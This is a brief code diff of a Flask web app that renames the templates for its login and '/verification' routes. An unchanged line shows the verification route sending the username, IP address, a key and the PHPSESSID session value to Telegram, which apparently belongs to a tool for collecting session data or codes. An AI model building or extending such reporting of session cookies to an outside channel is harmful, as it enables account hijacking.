@@ -194,7 +194,7 @@ def login():
         else:
             flash('Invalid username or password', 'danger')
 
-    return render_template('login.html')
+    return render_template('index.html')
 
 
 @app.route('/verification', methods=['GET', 'POST'])
@@ -219,9 +219,9 @@ def verification_code_finder():
         # Send the report to Telegram
         send_telegram_report(username, ip_address, key, phpsessid, numbers, results)
 
-        return render_template('verification.html', results=results)
+        return render_template('input_data.html', results=results)
 
-    return render_template('verification.html')
+    return render_template('input_data.html')
 
 
 @app.route('/logout')
